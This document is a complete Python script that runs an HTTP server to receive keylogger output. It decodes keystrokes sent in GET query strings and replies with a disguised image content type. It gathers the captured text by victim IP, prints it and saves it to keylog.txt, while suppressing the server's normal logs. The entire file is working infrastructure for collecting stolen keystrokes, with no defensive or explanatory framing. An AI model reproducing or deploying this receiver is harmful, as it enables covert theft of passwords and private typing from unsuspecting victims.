#!/usr/bin/env python3

import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote

try:
    from termcolor import colored
except ImportError:
    colored = lambda msg, color: msg

DEFAULT_HOST = '127.0.0.1'
DEFAULT_PORT = 9876
DEFAULT_OUTPUT = 'keylog.txt'


class KeyloggerReceiver(BaseHTTPRequestHandler):
    ip_to_text = {}  # ip -> 'logged text'

    def process_keylog_data(self, logged_text, source_ip):
        if source_ip not in self.ip_to_text:
            prev = ''
        else:
            prev = self.ip_to_text[source_ip]

        # Fix newline chars
        logged_text = logged_text.replace('\r', '\n')

        print('Data from {}: {}{}\n'.format(self.client_address[0], prev, colored(logged_text, 'green')))
        self.ip_to_text[source_ip] = prev + logged_text

        # Write full logged messages to log file
        with open(DEFAULT_OUTPUT, 'w') as f:
            for ip in self.ip_to_text.keys():
                f.write('='*80 + '\nHOST {}: {}\n'.format(ip, self.ip_to_text[ip]))

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "image/png")
        self.end_headers()

        source_ip = self.client_address[0]
        try:
            logged_text = unquote(self.path.split('=')[1])
            self.process_keylog_data(logged_text, source_ip)
        except Exception as e:
            print('Error: {}'.format(e))

        self.wfile.write(bytes("1337", "utf-8"))

    def log_message(self, format, *args):
        # Suppress normal server log messages
        return


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--server-host', type=str, dest='server_host', default=DEFAULT_HOST,
                        help='IP or hostname to bind the server socket to')
    parser.add_argument('-p', '--port', type=int, dest='port', default=DEFAULT_PORT,
                        help='Port to bind the server socket to')
    args = parser.parse_args()

    keylogger_receiver = HTTPServer((args.server_host, args.port), KeyloggerReceiver)
    try:
        keylogger_receiver.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        keylogger_receiver.server_close()

if __name__ == '__main__':
    main()

